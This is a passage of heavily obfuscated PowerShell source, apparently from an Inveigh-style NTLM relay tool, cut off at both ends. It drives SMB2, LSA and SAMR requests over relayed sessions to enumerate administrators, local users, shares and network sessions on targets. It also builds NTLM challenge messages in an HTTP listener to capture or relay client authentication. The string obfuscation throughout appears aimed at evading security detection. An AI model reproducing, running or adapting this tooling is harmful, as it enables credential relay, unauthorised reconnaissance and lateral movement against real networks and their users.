                                    ${STA`GE} = ("{1}{0}{2}{3}" -f'okup','LSALo','S','ids')
                                }
                                else
                                {
                                    ${s`TaGE} = ("{0}{1}{5}{3}{2}{4}" -f 'L','SA','olic','P','y','QueryInfo')    
                                }

                            }

                            ("{2}{1}{3}{0}{4}"-f'l','r','LSAQue','yInfoPo','icy')
                            {
                                [Byte[]]${LsA`_Dom`A`i`N_LEnGT`h_bY`TeS} = ${cl`Ien`T`_REceIvE}[148..149]
                                ${LSa`_DOmAi`N`_`Le`Ngth} =   (  &('Ls') ("Va"+"RIaBLe"+":xV"+"8QnB")  ).vAlUE::("{1}{0}"-f 'oInt16','T').Invoke(${lsa`_DOMA`In_l`E`Ngt`h_b`yTEs},0)
                                [Byte[]]${LSA`_D`OMaiN_A`ctUal_coUNT_`By`Tes} = ${CL`iEnT_r`e`CEiVE}[168..171]
                                ${L`SA_dOMaIn`_ACTuAl_`Co`UNT} =   (&("{2}{0}{1}"-f 'a','blE','varI') xv8QNb ).ValUe::("{2}{0}{1}" -f'o','Int32','T').Invoke(${l`sA_DO`mAin_`A`CtUa`L_C`oUnt_BYtes},0)
                                
                                if(${L`s`A_Do`M`A`in_ACTUAl`_COuNt} % 2)
                                {
                                    ${lsA_D`O`M`A`In_le`NgTH} += 2
                                }

                                [Byte[]]${LSA`_d`oMAI`N_sID} = ${C`liE`N`T_rECEive}[(176 + ${L`sA_`DOMa`I`N_lenGtH})..(199 + ${lsA`_`Do`mA`iN_LEngTH})]
                                ${St`A`GE} = ("{2}{0}{1}"-f'los','e','LSAC')
                            }

                            ("{0}{2}{1}" -f'NetSe','num','ssE')
                            {

                                if(  $xV8qNB::"tOs`TrING"(${C`LiENt_RE`C`e`iVE}[172..175]) -eq ("{2}{3}{0}{1}"-f '00-','00','0','5-00-') -or  ( &("{0}{1}"-f'd','ir') VARIaBle:XV8Qnb  ).VaLuE::"T`OSTRI`Ng"(${C`liEnt_`REc`E`iVe}[12..15]) -ne ("{1}{0}{2}" -f '00-00-0','00-','0'))
                                {
                                    ${STA`gE} = ("{0}{1}{2}" -f 'Clos','eReques','t')
                                }
                                else
                                {
                                    ${StA`GE} = ("{0}{2}{1}" -f 'Par','VC','seSRVS')
                                }

                            }

                            ("{3}{0}{2}{1}" -f'ShareE','ll','numA','Net')
                            {
                                ${st`AgE} = ("{2}{0}{1}" -f'SV','C','ParseSRV')
                            }

                            ("{2}{0}{1}"-f'penA','lias','O')
                            {
                                ${S`TeP}++
                                [Byte[]]${Samr`_POL`IC`Y_`Han`dlE} = ${Cl`I`ent_re`ceiVe}[140..159]
                        
                                if( ( &("{1}{0}"-f 'ir','d') ('v'+'A'+'RiaBl'+'E:XV8qN'+'B') ).VALUE::"toStR`ING"(${C`Li`ENt_re`ceive}[156..159]) -eq ("{0}{3}{2}{1}" -f '7','-00-c0','00','3-'))
                                {
                                    ${St`A`gE} = ("{2}{0}{4}{3}{1}" -f 'MRClos','st','SA','Reque','e')
                                }
                                else
                                {
                                    ${st`Age} = ("{3}{2}{4}{0}{1}"-f 'li','as','e','GetMemb','rsInA')
                                }

                            }

                            ("{2}{1}{0}"-f'n','penDomai','O')
                            {
                                ${ST`ep}++
                                [Byte[]]${samR_D`o`Main`_hANDle} = ${C`L`IeNT_R`E`CeiVe}[140..159]

                                if(${ActI`ON_s`T`AGE} -eq ("{1}{0}"-f 'ser','U'))
                                {
                                    ${S`TaGE} = ("{0}{4}{1}{3}{2}"-f 'EnumD','inU','s','ser','oma')
                                }
                                else
                                {
                                    ${s`T`Age} = ("{2}{1}{0}"-f's','me','LookupNa')
                                }

                            }

                            ("{1}{2}{0}" -f'up','OpenGr','o')
                            {
                                ${S`TeP}++
                                [Byte[]]${GR`OUp_hANd`Le} = ${cLI`EnT_re`C`E`Ive}[140..159]
                                ${StA`gE} = ("{2}{0}{4}{3}{1}"-f 'yGro','ber','Quer','em','upM')
                            }

                            ("{0}{3}{2}{1}" -f 'Quer','Member','roup','yG')
                            {
                                ${sT`ep}++
                                [Byte[]]${r`ID_`coun`T_bYtes} = ${Cli`E`Nt_Rece`Ive}[144..147]
                                ${Ri`d_c`Ou`Nt} =  (  &("{0}{1}"-f 'it','eM')  ("vArIa"+"bLe"+":x"+"v8"+"QNb")  ).VAluE::("{2}{0}{1}" -f'In','t16','To').Invoke(${R`iD_coUnT_b`Yt`Es},0)
                                [Byte[]]${R`id_`liSt} = ${cLiE`N`T_REcEI`VE}[160..(159 + (${rID_co`U`Nt} * 4))]
                                ${S`T`Age} = ("{1}{2}{3}{0}"-f 'ids','Loo','k','upR')
                            }

                            ("{0}{1}{2}"-f 'QueryIn','fo','Request')
                            {
                                ${Fi`L`e_id} = ${CLi`en`T`_rece`IVe}[132..147]
                                ${S`T`AGe} = ("{1}{2}{0}" -f 'Bind','R','PC')
                            }

                            ("{1}{0}{2}"-f 'eque','ReadR','st')
                            {
                                ${STa`gE} = ${StAGe`_`NExT}
                            }

                            ("{0}{1}"-f 'RPCB','ind')
                            {
                                ${s`TA`GE} = ("{1}{0}{2}" -f'ues','ReadReq','t')
                            }

                            ("{1}{3}{4}{0}{2}"-f'eRequ','SA','est','M','RClos')
                            {
                                ${S`Tep}++

                                if(${St`eP} -eq 8)
                                {
                                    ${I`NvEigh}."OuTp`UT`_`queue"."A`dd"(("[!] [$(Get-Date -format s)] $Group group not found ")) > ${n`ULL}
                                    ${S`TAgE} = ("{0}{1}{2}"-f'T','reeDisconne','ct')
                                }
                                else
                                {

                                    if(${ST`EP} -eq 5 -and ${A`cti`on_`sTAgE} -eq ("{1}{0}"-f 'p','Grou'))
                                    {
                                        ${lsa_`Do`mA`IN_Sid} = 0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00
                                        ${S`id`_CouNt} = 0x01,0x00,0x00,0x00
                                    }

                                    ${St`AGe} = ("{1}{0}{2}" -f'enD','Op','omain')
                                }

                            }

                            ("{2}{1}{0}"-f 'nect','eCon','Tre')
                            {
                                ${t`R`Ee_iD} = ${cLiENT`_rE`C`EivE}[40..43]
                                ${AcCEss_`Ma`sk} = ${n`Ull}

                                if(${ClIE`NT_REcE`IVE}[76] -eq 92)
                                {
                                    ${TR`ee`_aCceS`s_mASK} = 0x00,0x00,0x00,0x00
                                }
                                else
                                {
                                    ${tReE`_A`ccEss_M`ASK} = ${Cl`iE`Nt_Re`C`eive}[80..83]
                                }

                                if(${Sha`Re`_`lIST}."C`OuNT" -gt 0)
                                {

                                    if(${CLiEnt`_R`ECeI`VE}[76] -ne 92)
                                    {

                                        foreach(${B`yte} in ${T`Ree_a`c`CeS`s_M`AsK})
                                        {
                                            ${Acc`esS_`ma`SK} =   $4vXN::("{0}{1}"-f 'T','oString').Invoke(${bY`Te},2).("{0}{1}{2}" -f'Pad','Le','ft').Invoke(8,'0') + ${a`CCEsS_`M`ASk}
                                        }
                                        
                                        ${Re`Spon`se`_obJEc`T_LIst} | &("{3}{1}{0}{2}"-f'bjec','re-O','t','Whe') {${_}."SHa`Re" -eq ${s`hArE`_`LIST}[${J}]} | &("{0}{1}{2}"-f'Fo','rEa','ch-Object') {${_}."Access Mask" = ${a`c`cEsS_M`ASK}}
                                        ${ST`AgE} = ("{2}{1}{0}{3}" -f'nn','eDisco','Tre','ect')
                                    }
                                    else
                                    {
                                        ${ACceSS_m`A`sK} = ("{7}{4}{6}{1}{3}{2}{5}{0}"-f'0','0000000','000000','00000','00','000','0','0000000')
                                        ${re`SP`oNsE_`OBjeCt_List} | &("{0}{2}{1}"-f 'W','ere-Object','h') {${_}."ShA`Re" -eq ${s`haRE`_list}[${J}]} | &("{2}{3}{1}{0}"-f 'ject','-Ob','Fo','rEach') {${_}."Access Mask" = ${aCC`e`ss_`mask}}
                                        ${St`AGe} = ("{2}{0}{1}{3}" -f'e','C','Tre','onnect')
                                        ${j}++
                                    }

                                }
                                else
                                {
                                    
                                    if(${aCTIO`N_S`T`A`gE} -eq ("{1}{0}"-f'are','Sh') -or ${a`cTIo`N_Sta`Ge} -eq ("{2}{1}{0}"-f 'n','Sessio','Net'))
                                    {
                                        ${naM`E`d`_pipe} = 0x73,0x00,0x72,0x00,0x76,0x00,0x73,0x00,0x76,0x00,0x63,0x00 
                                    }
                                    else
                                    {
                                        ${nAm`Ed_pI`pe} = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 
                                    }

                                    ${tR`EE`_iPC} = ${T`R`EE_ID}
                                    ${s`Tage} = ("{1}{2}{0}"-f'st','CreateRequ','e')
                                }

                            }

                            ("{0}{3}{1}{2}"-f 'Tree','onn','ect','Disc')
                            {

                                if(${acTI`oN} -eq 'All')
                                {

                                    switch (${A`CtIOn_sta`gE}) 
                                    {

                                        ("{0}{1}"-f'g','roup')
                                        {

                                            if(${r`Pc_A`ccesS_deN`IEd})
                                            {
                                                ${AC`T`io`N_stAgE} = ("{0}{1}"-f 'shar','e')
                                            }
                                            else
                                            {
                                                ${aCtIO`N_S`TA`gE} = ("{0}{1}"-f 'u','ser')
                                                ${S`TeP} = 0
                                            }

                                            ${S`Ta`ge} = ("{3}{1}{2}{0}" -f 't','reeconne','c','t')
                                        }

                                        ("{1}{0}" -f'r','use')
                                        {
                                            ${ACtio`N`_Sta`Ge} = ("{1}{2}{0}" -f'ion','net','sess')
                                            ${S`TagE} = ("{2}{1}{3}{0}"-f't','c','tree','onnec')
                                        }

                                        ("{1}{0}{2}" -f'etses','n','sion')
                                        {
                                            ${A`ctio`N`_S`Tage} = ("{0}{1}" -f 'sh','are')
                                            ${sT`AgE} = ("{0}{1}{3}{2}"-f'tre','e','ect','conn')
                                        }

                                        ("{1}{0}"-f 'e','shar')
                                        {

                                            if(${sH`ArE_L`i`ST}."co`UNT" -gt 0 -and ${J} -lt ${share_`l`ist}."CO`UnT" - 1)
                                            {
                                                ${s`Ta`ge} = ("{2}{1}{0}" -f 'ect','Conn','Tree')
                                                ${J}++
                                            }
                                            elseif(${SH`ARE`_L`iSt}."cO`UnT" -gt 0 -and ${j} -eq ${s`H`ARE_lIsT}."cO`UnT" - 1)
                                            {
                                                ${trE`e_Id} = ${T`Re`E_Ipc}
                                                ${St`AGe} = ("{3}{1}{0}{2}" -f'con','is','nect','TreeD')
                                                ${j}++
                                            }
                                            else
                                            {
                                                
                                                if(${ATT`ACK} -contains ("{2}{1}{0}"-f 'ion','ess','s'))
                                                {
                                                    ${ST`Age} = ("{0}{1}" -f'Exi','t')
                                                }
                                                else
                                                {
                                                    ${STA`GE} = ("{1}{0}"-f 'ogoff','L')
                                                }

                                            }
                                            
                                        }

                                    }

                                }
                                else
                                {
                                    
                                    if(${a`C`TIo`N_StagE} -eq ("{0}{1}"-f'Shar','e') -and ${SHaR`e`_LIST}."c`ounT" -gt 0 -and ${j} -lt ${SH`Ar`E_`lIST}."cOu`Nt" - 1)
                                    {
                                        ${sT`AGe} = ("{3}{2}{1}{0}"-f 'ct','onne','eC','Tre')
                                        ${J}++
                                    }
                                    elseif(${AcT`ioN_`stAGE} -eq ("{1}{0}" -f're','Sha') -and ${SHa`Re_Li`St}."COU`Nt" -gt 0 -and ${j} -eq ${Sh`AR`e_l`ISt}."CoU`NT" - 1)
                                    {
                                        ${tr`E`E_Id} = ${tree`_Ipc}
                                        ${S`Ta`Ge} = ("{4}{0}{1}{2}{3}"-f'ree','Dis','conne','ct','T')
                                        ${j}++
                                    }
                                    else
                                    {
                                    
                                        if(${i`N`VeIGh`_SE`SS`Ion} -and !${lOG`oFF})
                                        {
                                            ${S`T`AGe} = ("{1}{0}" -f'it','Ex')
                                        }
                                        else
                                        {
                                            ${s`TAgE} = ("{1}{0}{2}" -f 'f','Logo','f')
                                        }

                                    }

                                }
                                
                            }

                        }

                    }

                    ("{3}{0}{2}{1}"-f 'ee','nnect','Co','Tr')
                    {
                        ${Mess`A`ge_iD}++
                        ${STa`Ge_`C`URreNt} = ${sta`GE}

                        if(${sHa`RE`_`lIST}."CoU`NT" -gt 0)
                        {
                            ${pa`TH} = "\\" + ${tAR`gET} + "\" + ${SH`ARe_lI`St}[${j}]
                            ${pA`TH_bY`T`eS} =  ( &("{2}{0}{1}" -f 'r','IABLE','vA')  ('iXg'+'d') ).VAlue::"UnI`C`odE".("{2}{0}{1}"-f 'yte','s','GetB').Invoke(${pA`Th})
                        }

                        ${pac`ket_S`MB_he`ADeR} = &("{2}{4}{1}{3}{5}{0}"-f'er','H','New-P','ea','acketSMB2','d') 0x03,0x00 0x01,0x00 ${Sm`B_`sI`GnIng} ${MeSsA`Ge_`ID} ${pROcEs`s`_`iD} ${TR`Ee`_ID} ${se`sSion`_Id}
                        ${PAck`et_smB`_`Da`Ta} = &("{7}{0}{3}{4}{2}{1}{6}{5}"-f'w-','onnectR','B2TreeC','P','acketSM','est','equ','Ne') ${PA`Th_By`TeS}
                        ${S`Mb_`hEa`deR} = &("{3}{1}{2}{7}{6}{8}{5}{4}{0}"-f 'onary','rtFrom-Pac','k','Conve','cti','Di','Order','et','ed') ${p`A`cKE`T_`Smb_hea`der}
                        ${SMB_D`A`TA} = &("{5}{6}{4}{9}{1}{7}{2}{0}{8}{3}"-f 'd','etOrde','e','ry','rtFrom-P','C','onve','r','Dictiona','ack') ${pA`CKe`T_Sm`B_DA`Ta}    
                        ${PACk`Et_Ne`TBi`oS`_`S`es`SION_SeR`VicE} = &("{4}{6}{1}{2}{7}{0}{3}{5}"-f'ssi','Packe','tNetBIOS','onServ','New','ice','-','Se') ${Sm`B_H`eA`dEr}."L`ENgtH" ${SM`B_`D`AtA}."Leng`Th"
                        ${n`eTB`IoS_`sEssION_`s`ErvI`CE} = &("{0}{2}{5}{3}{4}{1}{6}"-f'ConvertF','dDiction','ro','PacketOrder','e','m-','ary') ${Pac`kEt`_NEtBi`Os_s`EsSION_sErv`iCe}
                        ${cli`eN`T_Se`Nd} = ${nETBIoS`_sEss`I`ON_serv`i`CE} + ${Smb_`HeA`dEr} + ${Smb`_DA`TA}
                        ${Sta`Ge} = ("{2}{0}{1}"-f'e','ive','SendRec')
                    }

                    ("{1}{2}{0}{3}" -f 'nnec','T','reeDisco','t')
                    {
                        ${me`Ss`A`ge_id}++
                        ${St`A`gE_CuRR`Ent} = ${STa`gE}
                        ${P`ACket_sm`B_hea`Der} = &("{0}{5}{6}{1}{2}{3}{4}" -f 'New-','ketS','MB2H','ea','der','P','ac') 0x04,0x00 0x01,0x00 ${S`mb_Sign`INg} ${m`e`ssAGE_`iD} ${prO`CESS`_Id} ${t`REe_`iD} ${se`SS`Ion_`Id}
                        ${PA`cK`ET_S`Mb_dATa} = &("{2}{1}{5}{0}{4}{3}" -f'TreeDisconnect','-PacketSM','New','equest','R','B2')
                        ${S`Mb`_h`eAdER} = &("{0}{4}{3}{7}{5}{2}{1}{6}{8}"-f'C','dDi','dere','vert','on','-PacketOr','ctionar','From','y') ${pAc`ket`_sm`B_`hEAdER}
                        ${Smb`_`daTA} = &("{8}{1}{5}{6}{2}{0}{7}{3}{4}{9}"-f'tOrderedDi','ert','-Packe','i','on','Fro','m','ct','Conv','ary') ${paC`KET_`SmB`_DATa}
                        ${Pa`CKEt_NeTB`iOS`_SesSIon_se`Rv`I`ce} = &("{2}{0}{9}{6}{7}{4}{5}{3}{1}{8}" -f'w-','es','Ne','IOSS','t','B','ket','Ne','sionService','Pac') ${sMb`_HEaD`Er}."len`gTh" ${smb_d`A`TA}."le`NG`TH"
                        ${N`eTbI`oS_`SESs`i`On_serV`icE} = &("{4}{1}{3}{0}{5}{2}" -f 'OrderedD','rom-Pack','ary','et','ConvertF','iction') ${p`AcKET_`N`ET`BiOS_Sess`I`O`N_S`e`RviCE}
                        ${CLI`ENT_`SENd} = ${n`etbiOS_sesS`IOn_SE`Rv`IcE} + ${s`Mb_H`E`ADEr} + ${Sm`B_D`A`TA}
                        ${s`TaGE} = ("{1}{2}{0}{3}"-f'Recei','Sen','d','ve')
                    }

                }
        
            }
            catch
            {
                ${erro`R`_mess`A`GE} = ${_}."eXC`Ep`TioN"."mes`s`AgE"
                ${E`RROr`_MESSagE} = ${eR`RoR_ME`sS`A`ge} -replace "`n",""
                ${i`N`Veigh}."oUT`Pu`T_`QUeUE"."a`dD"(("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage_current ")) > ${n`ULl}
                ${stA`ge} = ("{0}{1}" -f 'E','xit')
            }

        }

        For(${I} = 0;${I} -lt ${E`N`U`mE`RATE_gRoU`p_U`SER_L`iST}."cou`Nt";${i}++)
        {
            ${U`ser_`EntRy} = ${EnUMe`Ra`TE`_gRO`Up_`US`Er_lIst}[${i}]
            ${UsEr_`enT`Ry_sp`l`IT} = ${us`Er`_E`NTRY}.("{0}{1}" -f 'S','plit').Invoke("\")
            ${d`o`mAIN} = ${u`seR_E`NtR`Y_`sPLIt}[0]
            ${usEr`NAme} = ${uS`E`R`_e`NTRY`_spLIt}[1]

            if(${i`NV`EIGh}."d`oM`AIN_`maPpING_T`AB`Le".("{2}{0}{3}{1}"-f'tains','y','Con','Ke').Invoke(${DOM`Ain}))
            {
                ${useR`_uP`da`Te} = (${UseR`N`A`ME} + "@" + ${InVE`iGH}."dOMAIN_mA`p`piNG`_`TABLe".${dOm`A`IN}).("{1}{0}" -f 'oUpper','T').Invoke()
                ${Enume`Rate_grO`UP_USe`R_li`st}[${I}] = ${US`eR_`Upd`ATe}
            }

        }

        For(${I} = 0;${I} -lt ${E`NU`MEraTe_grOup`_g`RoUP_LIST}."c`ounT";${I}++)
        {
            ${gr`Ou`p_E`NtRy} = ${EnUMEr`At`e`_gR`oUP_`GROUp`_LiSt}[${I}]
            ${Grou`P`_eNT`Ry_s`P`liT} = ${GrO`UP_E`NTRy}.("{0}{1}" -f'S','plit').Invoke("\")
            ${d`O`mAIN} = ${GRoU`P`_EnTRy`_SPlIT}[0]
            ${gRo`Up} = ${g`RoU`P_eN`Try_`SPL`IT}[1]

            if(${inVeI`Gh}."DoMaIn`_MAPpiNg_t`A`BlE".("{0}{1}{2}"-f 'Con','tainsK','ey').Invoke(${d`OmAin}))
            {
                ${GrOuP_U`p`D`Ate} = (${Gr`o`Up} + "@" + ${In`V`EigH}."d`oMAi`N_ma`PPI`Ng_`TABLe".${Do`Ma`iN}).("{0}{1}{2}"-f'T','oU','pper').Invoke()
                ${e`NU`MERaTe_G`RoU`P_gROUp_lisT}[${I}] = ${GRo`UP_uP`DATe}
            }

        }

        ${I`NVEIGH}."SEss`ion_`MeSsa`gE_i`D`_taBLE"[${INvEI`gH}."sessiO`N_CoU`NT"] = ${Me`sSa`Ge_Id}

        for(${i} = 0;${I} -lt ${I`N`VEigH}."EN`U`merATe"."Co`UnT";${I}++)
        {

            if(${iNVEi`Gh}."e`N`UmEraTe"[${i}]."i`P" -eq ${t`Arg`ET})
            {
                ${tArgE`T_IN`dEx} = ${I}
                break
            }

        }

        if(${e`NUmE`Rateg`R`oUp} -eq ("{1}{0}{2}{3}"-f 'mi','Ad','nistrat','ors'))
        {
            ${iNVE`I`gh}."ENUM`er`AtE"[${tArG`Et_`In`DEx}]."Administrator Users" = ${ENu`mEra`Te_GR`ouP_USE`R`_Li`ST}
            ${INve`i`Gh}."E`NU`mEr`ATe"[${T`ARGeT_iN`d`eX}]."Administrator Groups" = ${eNumERA`T`e`_g`ROU`P_GrOUp`_LIST}
        }

        ${IN`V`eIGH}."e`Nume`Rate"[${targ`e`T_Ind`Ex}]."Local Users" = ${eNuMe`Rat`E_`US`er`_liSt}
        ${inVe`IGh}."EnUm`ErA`Te"[${tArGE`T`_in`dEX}]."sHaR`eS" = ${eN`UmeRatE_shAr`E`_`Li`ST}
        ${net_`s`ESs`IONS_`U`NIQue} = @()

        foreach(${nEt`_sESSion_`e`Ntry} in ${e`NUM`Era`TE_NetSESS`iOn_lISt})
        {

            if(${inVeI`gh}."En`Um`ERATE"[${TA`RGET_i`NdEx}]."NE`T`sesS`IonS" -notcontains ${n`ET`_ses`S`ION_EnTry})
            {
                ${nEt_Ses`SiOn`s`_U`Nique} += ${Ne`T`_se`ssi`oN_e`NTry}
            }

            ${nEt_S`essIO`N`_`IP} = (${n`e`T_sEssi`o`N_EnT`RY}.("{0}{1}"-f 'Spli','t').Invoke("\"))[2]
            ${neT_s`esS`Ion_U`seR} = (${N`E`T_`sess`iOn_En`TRY}.("{0}{1}" -f 'Spl','it').Invoke("\"))[3]

            for(${I} = 0;${i} -lt ${IN`VEi`GH}."ENUMe`R`AtE"."co`UNT";${I}++)
            {

                if(${iN`V`EIGh}."En`UmEr`ATE"[${i}]."Ip" -contains ${n`e`T_seS`siON_Ip})
                {
                    ${net`_`s`ESsiON_Ind`Ex} = ${I}
                    break
                }

            }

            if(${NE`T_sEs`SiO`N_iN`D`ex} -and ${i`N`VeIgH}."E`Num`Er`AtE"[${Net_se`ss`IO`N_`i`NdEX}]."N`E`TseSsiO`NS" -notcontains ${NET`_S`esSIOn`_uSeR})
            {
                ${in`Veigh}."eN`Um`ERatE"[${N`Et_SE`SSIOn_inD`EX}]."NetSessions Mapped" += ${Ne`T_Se`ssIon_u`sER}
            }
            else
            {
                ${in`VeIGh}."en`U`MErate".("{0}{1}" -f 'Ad','d').Invoke((&("{3}{2}{4}{0}{1}" -f'Objec','t','w-Re','Ne','layEnum') -IP ${n`et`_sesS`Ion`_ip} -NetSessionsMapped ${n`et_s`esSIon_Us`er})) > ${N`UlL}
            }

        }

        ${INV`EiGh}."e`NUmer`ATE"[${TArg`et`_I`NDEx}]."NETSes`s`IO`Ns" += ${net`_`sESs`IOns`_uniqUE}
        
        if(!${RPC_acC`ESS`_D`Eni`Ed})
        {
            ${iNV`eIGh}."e`NumE`RAte"[${t`ArG`et_indEX}]."E`NumE`RATE" = $(&("{2}{0}{1}"-f'et-Dat','e','G') -format ('s'))
        }

    }

}


${hTTP_SC`R`iPTb`loCk} = 
{ 
    param (${At`TaCK},${Chal`le`NGe},${ComMa`ND},${e`NUme`RA`Te},${ENume`RaT`eGrOUp},${fA`iLeDlO`gI`N`ThRe`ShOLd},${h`TTPiP},${ht`Tpp`ORT},
    ${https`_L`i`ST`eNeR},${p`RO`xy},${pRoXYI`G`No`Re},${proxY_`li`s`TenEr},${ReLaY`AutoD`isAb`LE},${ReP`Ea`TeNU`mErATe},
    ${re`PEAt`eX`ECutE},${SER`VICE},${S`mB_vER`s`Ion},${Se`ss`I`ON`lIM`ItPriv},${sEssioNlim`itunP`R`IV},${sES`SioNL`IMI`Ts`haRe},
    ${seSSiO`Np`RiORi`Ty},${t`Ar`GeT},${t`ARgEtM`ODE},${tArg`eT`RefrE`sH},${usern`A`mE},${WP`ADaUtH},${wp`Ada`UtHIgNo`Re},${Wp`A`dRE`SpoN`Se})

    function G`et-nTl`mcHAl`le`Ng`EBaSe`64
    {
        param ([String]${cha`Lle`Nge},[String]${c`LiEN`TiPAD`DresS},[Int]${C`LIeNtP`o`RT})

        ${htt`P_TIM`eS`TA`mp} = &("{1}{2}{0}"-f'te','Get','-Da')
        ${HT`T`P_tiMe`sT`AmP} = ${hTtp`_`TiMEs`T`AmP}.("{2}{1}{0}" -f'me','eTi','ToFil').Invoke()
        ${h`T`TP`_timesTaMP} =  (&("{0}{1}"-f 'va','riaBLE')  XV8Qnb).valUe::"To`StrinG"( (  &("{0}{1}"-f 'd','iR')  vAriaBLe:xV8qNb).vALue::("{0}{2}{1}" -f 'Ge','tes','tBy').Invoke(${HTtp_Tim`e`S`Ta`Mp}))
        ${Ht`Tp_t`ImeS`TA`MP} = ${H`TTP_TiMesT`A`MP}.("{0}{1}" -f 'Sp','lit').Invoke("-") | &("{2}{4}{1}{3}{0}"-f 'ect','Each-O','F','bj','or'){[Char]  $4vXN::("{0}{1}" -f 'To','Int16').Invoke(${_},16)}

        if(${CHalL`E`Nge})
        {
            ${HTTp_c`haL`LE`NGE} = ${c`hAL`LEnGE}
            ${hTTP_C`hal`lENGe`_ByTES} = ${HT`Tp_Chal`LENGE}.("{1}{0}"-f 'sert','In').Invoke(2,'-').("{1}{0}" -f't','Inser').Invoke(5,'-').("{1}{0}" -f 'sert','In').Invoke(8,'-').("{0}{1}"-f'Inser','t').Invoke(11,'-').("{1}{0}" -f 'nsert','I').Invoke(14,'-').("{2}{1}{0}"-f'sert','n','I').Invoke(17,'-').("{0}{1}"-f'I','nsert').Invoke(20,'-')
            ${hTtP_ChAlLEN`Ge`_`ByTes} = ${hTtP`_ChAL`lEN`gE_`BYT`eS}.("{0}{1}"-f 'Spl','it').Invoke("-") | &("{3}{4}{0}{2}{1}" -f 'ch-','ect','Obj','For','Ea'){[Char] ( &("{0}{1}{2}{3}"-f'GET-V','ARIA','b','le') ("4"+"VXN")  -ValUe )::("{1}{0}"-f'16','ToInt').Invoke(${_},16)}
        }
        else
        {
            ${httP_cHALl`e`NGe`_BytES} = [String](1..8 | &("{2}{0}{1}" -f'Eac','h-Object','For'){"{0:X2}" -f (&("{1}{0}{3}{2}" -f'et-','G','m','Rando') -Minimum 1 -Maximum 255)})
            ${hT`Tp_cH`A`LleNge} = ${hTtp_c`h`ALlE`NgE_By`TeS} -replace ' ',''
            ${H`TTP_`cHa`lLEnGe_BYtEs} = ${Ht`TP_CHAl`lenG`E`_`ByTEs}.("{1}{0}" -f 'plit','S').Invoke(" ") | &("{2}{1}{0}"-f 'h-Object','orEac','F'){[Char] (&("{1}{0}" -f'-ItEm','gEt')  ('V'+'ariABLe:'+'4vxN')  ).vAlUE::("{1}{0}"-f't16','ToIn').Invoke(${_},16)}
        }

        if(!${inV`e`IGH}."hTtP`_`s`eSSIoN_tABle".("{3}{1}{0}{2}" -f'K','ins','ey','Conta').Invoke("$ClientIPAddress`:$ClientPort"))
        {
            ${i`NvE`Igh}."hTtp_sEs`s`Ion_`T`ABLe".("{1}{0}" -f'dd','A').Invoke("$ClientIPAddress`:$ClientPort",${H`Ttp_`cha`Ll`ENge})
        }
        else
        {
            ${INv`ei`GH}."h`T`Tp`_S`esSioN_TaBLe"["$ClientIPAddress`:$ClientPort"] = ${HTTP`_`ChallE`Nge}
        }

        ${hOS`T`NAMe_b`yTES} =   (  &("{1}{0}" -f'IABLe','VAr')  ("iX"+"gD")  -VaLuEo)::"u`N`ICODe".("{1}{0}{2}" -f 'tByt','Ge','es').Invoke(${in`V`EIgH}."C`O`MpuT`eR`_NaME")
        ${netB`i`oS_DOM`Ai`N_byTeS} =   (  &("{1}{0}" -f'AriabLe','V') ('iX'+'Gd') -VAlueO)::"u`N`ICoDE".("{1}{0}"-f'tes','GetBy').Invoke(${iNvE`i`Gh}."NeTb`i`Os_doMAIN")
        ${D`NS_dO`MAi`N_b`yt`Es} =  (&("{0}{2}{1}" -f 'vaRiA','E','Bl') iXGd -vALUEoNLY)::"UN`ICode".("{1}{0}" -f 'ytes','GetB').Invoke(${iN`Vei`Gh}."D`Ns_D`OMAin")
        ${dnS_H`o`stnAmE`_`B`YtES} =   (&('LS') ("VA"+"ri"+"aBLe:IXGD")  ).vALUE::"Uni`c`oDE".("{0}{1}{2}"-f 'Get','Byt','es').Invoke(${InVE`i`gh}."DN`S_c`omPuter_na`me")
        ${hO`ST`Name_`l`ENgTh} =   (  &("{0}{1}"-f 'GC','I') vaRIABle:XV8qNb).VaLUE::("{2}{1}{0}" -f 'tes','y','GetB').Invoke(${HosTN`AM`E_byt`eS}."LENg`Th")[0,1]
        ${Ne`Tbi`Os_D`O`mAiN_len`G`Th} =  ( &("{1}{0}"-f 'RiaBLe','va') xV8qNb  -vAl )::("{1}{2}{0}" -f'tes','G','etBy').Invoke(${n`EtbIo`S_`d`om`Ai`N_byTEs}."L`EnGtH")[0,1]
        ${D`N`s_DomAiN_lE`NgtH} =   $Xv8Qnb::("{0}{1}" -f'Get','Bytes').Invoke(${Dn`s_doMAIn_`B`yTES}."l`eNG`Th")[0,1]
        ${dnS`_hOS`Tnam`e_`LenGtH} =  (  &("{1}{0}{2}" -f'BL','gET-VARia','e') ("xv8q"+"nB")  ).vAlue::("{0}{2}{1}" -f 'GetByt','s','e').Invoke(${dn`S_H`ostN`AmE_bYteS}."Le`NGth")[0,1]
        ${TargEt_`L`eNg`Th} =  $XV8qnb::("{0}{1}" -f'GetBy','tes').Invoke(${HoSTnAM`E_`ByteS}."l`enG`TH" + ${neTbiOS`_d`OmaIN_bYt`Es}."L`eNGTh" + ${d`N`S_DoMaIn_b`yT`es}."lenG`TH" + ${d`N`s`_DomaIN_byT`ES}."leN`G`TH" + ${dns_hOsT`NAm`e_b`ytEs}."Len`g`TH" + 36)[0,1]
        ${Tar`Ge`T_o`Ff`sEt} =  (  &('gI')  ('VARiAB'+'L'+'E:Xv'+'8Qnb')).ValUe::("{1}{2}{0}" -f 's','GetByt','e').Invoke(${NET`Bio`s_`dO`M`A`iN_BYTES}."LEn`g`Th" + 56)

        ${H`T`Tp_nTlm_Byt`eS} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                            ${N`E`T`BiO`s_d`Omain_Len`Gth} +
                            ${nEt`BI`os_DOMA`In_LEngtH} +
                            0x38,0x00,0x00,0x00 +
                            0x05,0x82,0x89,0xa2 +
                            ${H`TTp_`cH`AllenG`e`_bY`TeS} +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 + 
                            ${TA`Rg`et_`lE`NgTH} +
                            ${T`ARg`Et_le`NgTh} + 
                            ${tAR`G`et_OFF`sEt} +
                            0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f +
                            ${netbIo`s`_doMaiN`_bY`TeS} +
                            0x02,0x00 + 
                            ${nEtBIos_DOM`AI`N`_LE`N`g`TH} +
